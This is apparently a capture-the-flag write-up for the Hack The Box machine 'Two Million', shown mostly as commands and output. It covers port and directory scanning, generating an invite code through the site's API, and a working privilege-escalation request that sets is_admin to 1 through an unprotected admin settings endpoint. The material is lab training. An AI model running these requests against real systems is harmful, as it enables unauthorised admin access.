# Hack the Box - Two Million

```shell
rustscan -b 1000 -u 5000 -r 0-65535 -a 10.10.11.221 -- -Pn
```
```shell
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Nmap? More like slowmap.🐢

[~] The config file is expected to be at "/home/superuser/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.10.11.221:22
Open 10.10.11.221:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-10 04:32 EDT
Initiating Parallel DNS resolution of 1 host. at 04:32
Completed Parallel DNS resolution of 1 host. at 04:32, 0.01s elapsed
DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 04:32
Scanning 10.10.11.221 [2 ports]
Discovered open port 22/tcp on 10.10.11.221
Discovered open port 80/tcp on 10.10.11.221
Completed Connect Scan at 04:32, 0.18s elapsed (2 total ports)
Nmap scan report for 10.10.11.221
Host is up, received user-set (0.19s latency).
Scanned at 2023-10-10 04:32:22 EDT for 0s

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.22 seconds
```

```shell
rustscan -u 5000 -p 22,80 -a 10.10.11.221 -- -Pn -sCV
```
```shell
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Nmap? More like slowmap.🐢

[~] The config file is expected to be at "/home/superuser/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.10.11.221:22
Open 10.10.11.221:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-10 04:34 EDT
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 04:34
Completed NSE at 04:34, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 04:34
Completed NSE at 04:34, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 04:34
Completed NSE at 04:34, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 04:34
Completed Parallel DNS resolution of 1 host. at 04:34, 0.01s elapsed
DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 04:34
Scanning 10.10.11.221 [2 ports]
Discovered open port 80/tcp on 10.10.11.221
Discovered open port 22/tcp on 10.10.11.221
Completed Connect Scan at 04:34, 0.20s elapsed (2 total ports)
Initiating Service scan at 04:34
Scanning 2 services on 10.10.11.221
Completed Service scan at 04:34, 6.36s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.11.221.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 04:34
Completed NSE at 04:34, 5.54s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 04:34
Completed NSE at 04:34, 0.72s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 04:34
Completed NSE at 04:34, 0.00s elapsed
Nmap scan report for 10.10.11.221
Host is up, received user-set (0.19s latency).
Scanned at 2023-10-10 04:34:22 EDT for 13s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJ+m7rYl1vRtnm789pH3IRhxI4CNCANVj+N5kovboNzcw9vHsBwvPX3KYA3cxGbKiA0VqbKRpOHnpsMuHEXEVJc=
|   256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOtuEdoYxTohG80Bo6YCqSzUY9+qbnAFnhsk4yAZNqhM
80/tcp open  http    syn-ack nginx
|_http-trane-info: Problem with XML parsing of /evox/about
| http-methods: 
|_  Supported Methods: GET
|_http-favicon: Unknown favicon MD5: 20E95ACF205EBFDCB6D634B7440B0CEE
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: Hack The Box :: Penetration Testing Labs
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 04:34
Completed NSE at 04:34, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 04:34
Completed NSE at 04:34, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 04:34
Completed NSE at 04:34, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.17 seconds
```
```shell
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://2million.htb -H 'Host: FUZZ.2million.htb' -mc 200
```
```shell

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://2million.htb
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.2million.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200
________________________________________________

:: Progress: [4989/4989] :: Job [1/1] :: 139 req/sec :: Duration: [0:00:24] :: Errors: 0 ::
```

![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/0ef99e9a-bc56-47c0-8bf3-7181152fe9fb)

```shell
feroxbuster -u http://2million.htb -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt --no-recursion --dont-extract-links --status-codes 200
```
```shell
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://2million.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
 👌  Status Codes          │ [200]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🏁  HTTP methods          │ [GET]
 🚫  Do Not Recurse        │ true
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET       94l      293w     4527c http://2million.htb/register
200      GET       80l      232w     3704c http://2million.htb/login
200      GET     1242l     3326w    64952c http://2million.htb/
200      GET       46l      152w     1674c http://2million.htb/404
200      GET       96l      285w     3859c http://2million.htb/invite
[####################] - 2m     26584/26584   0s      found:5       errors:0      
[####################] - 2m     26584/26584   249/s   http://2million.htb/ 
```

![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/22f029f5-2c93-4b03-9de0-3c684d5401cd)
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/5e6f1090-1cf2-4ea3-935f-8f88533a0ebe)

Obfuscated:
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/bee450a0-fc56-4811-8c53-8948c7ccad21)

Deobfuscated:
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/a7b6186a-dcca-4445-8bd0-236d7cbe4e77)

Curl:
```curl
curl -s -X POST http://2million.htb/api/v1/invite/how/to/generate | jq
```
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/cad026bd-b85f-40ce-b0f7-5ddd8907343d)

ROT13 Decode:
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/82b1b064-3394-4f89-8678-790a919b566c)

```curl
curl -s -X POST http://2million.htb/api/v1/invite/generate | jq
```
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/be3e9c4b-031d-4b11-8a33-56ec014abc81)

Base64 Decode:
```shell
echo "Sk9TTUItS1pMSzUtNUdVQTQtWkdOQTE=" | base64 -d
```
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/56698181-2f81-4852-85af-ce55033f31f3)

Signup:
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/35957105-5b23-4642-b962-17c5cf2a0a23)

Login:
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/befaa95b-3fd1-4970-8351-60b2bf1a16e2)

Dashboard:
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/87fd652c-b3c1-4e0f-b0c1-0241d02b5f48)

API:

Request All API Routes
```shell
root@kali# curl -vvv http://2million.htb/api/v1
* processing: http://2million.htb/api/v1
*   Trying 10.10.11.221:80...
* Connected to 2million.htb (10.10.11.221) port 80
> GET /api/v1 HTTP/1.1
> Host: 2million.htb
> User-Agent: curl/8.2.1
> Accept: */*
> 
< HTTP/1.1 401 Unauthorized
< Server: nginx
< Date: Tue, 10 Oct 2023 14:43:54 GMT
< Content-Type: text/html; charset=UTF-8
< Transfer-Encoding: chunked
< Connection: keep-alive
< Set-Cookie: PHPSESSID=sg5s3rcmrhb11bp3jf5g5jrls5; path=/
< Expires: Thu, 19 Nov 1981 08:52:00 GMT
< Cache-Control: no-store, no-cache, must-revalidate
< Pragma: no-cache
< 
* Connection #0 to host 2million.htb left intact
```

```shell
root@kali# curl -s http://2million.htb/api/v1 -H "Cookie: PHPSESSID=dihm5b2fhtpggrecrhjnfm62h8" | jq
{
  "v1": {
    "user": {
      "GET": {
        "/api/v1": "Route List",
        "/api/v1/invite/how/to/generate": "Instructions on invite code generation",
        "/api/v1/invite/generate": "Generate invite code",
        "/api/v1/invite/verify": "Verify invite code",
        "/api/v1/user/auth": "Check if user is authenticated",
        "/api/v1/user/vpn/generate": "Generate a new VPN configuration",
        "/api/v1/user/vpn/regenerate": "Regenerate VPN configuration",
        "/api/v1/user/vpn/download": "Download OVPN file"
      },
      "POST": {
        "/api/v1/user/register": "Register a new user",
        "/api/v1/user/login": "Login with existing user"
      }
    },
    "admin": {
      "GET": {
        "/api/v1/admin/auth": "Check if user is admin"
      },
      "POST": {
        "/api/v1/admin/vpn/generate": "Generate VPN for specific user"
      },
      "PUT": {
        "/api/v1/admin/settings/update": "Update user settings"
      }
    }
  }
}
```
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/059c0679-7ae5-4f2e-99f3-9441296c9808)

```shell
root@kali# curl -s -X PUT http://2million.htb/api/v1/admin/settings/update -H "Cookie: PHPSESSID=dihm5b2fhtpggrecrhjnfm62h8" | jq
{
  "status": "danger",
  "message": "Invalid content type."
}
```
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/1e890b9d-4068-4ab3-9cf5-14475e6f6c08)

```shell
root@kali# curl -vvv -X PUT http://2million.htb/api/v1/admin/settings/update -H "Cookie: PHPSESSID=dihm5b2fhtpggrecrhjnfm62h8" | jq
* processing: http://2million.htb/api/v1/admin/settings/update
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0*   Trying 10.10.11.221:80...
* Connected to 2million.htb (10.10.11.221) port 80
> PUT /api/v1/admin/settings/update HTTP/1.1
> Host: 2million.htb
> User-Agent: curl/8.2.1
> Accept: */*
> Cookie: PHPSESSID=dihm5b2fhtpggrecrhjnfm62h8
> 
< HTTP/1.1 200 OK
< Server: nginx
< Date: Tue, 10 Oct 2023 14:49:08 GMT
< Content-Type: application/json
< Transfer-Encoding: chunked
< Connection: keep-alive
< Expires: Thu, 19 Nov 1981 08:52:00 GMT
< Cache-Control: no-store, no-cache, must-revalidate
< Pragma: no-cache
< 
{ [64 bytes data]
100    53    0    53    0     0    307      0 --:--:-- --:--:-- --:--:--   308
* Connection #0 to host 2million.htb left intact
{
  "status": "danger",                                                                                                                          
  "message": "Invalid content type."                                                                                                           
}  
```
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/a4e618b3-96b5-43e4-8860-19e195cd62da)

```shell
> curl -s -X PUT http://2million.htb/api/v1/admin/settings/update -H "Cookie: PHPSESSID=dihm5b2fhtpggrecrhjnfm62h8" -H "Content-Type: application/json" | jq
{
  "status": "danger",
  "message": "Missing parameter: email"
}
```

```shell
curl -s -X PUT http://2million.htb/api/v1/admin/settings/update -H "Cookie: PHPSESSID=dihm5b2fhtpggrecrhjnfm62h8" -H "Content-Type: application/json" -d '{"email":"root@pwnstuff.com"}' | jq
{
  "status": "danger",
  "message": "Missing parameter: is_admin"
}
```

```shell
> curl -s \
-X PUT http://2million.htb/api/v1/admin/settings/update \
-H "Cookie: PHPSESSID=dihm5b2fhtpggrecrhjnfm62h8" \
-H "Content-Type: application/json" \
-d '{"email":"root@pwnstuff.com", "is_admin":" "}' | jq
{
  "status": "danger",
  "message": "Variable is_admin needs to be either 0 or 1."
}
```
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/9a30f25e-0b6e-4180-a6f7-5864608b282f)

```shell
curl -s -X PUT http://2million.htb/api/v1/admin/settings/update -H "Cookie: PHPSESSID=dihm5b2fhtpggrecrhjnfm62h8" -H "Content-Type: application/json" -d '{"email":"root@pwnstuff.com", "is_admin":1}' | jq
{
  "id": 13,
  "username": "attacker",
  "is_admin": 1
}
```
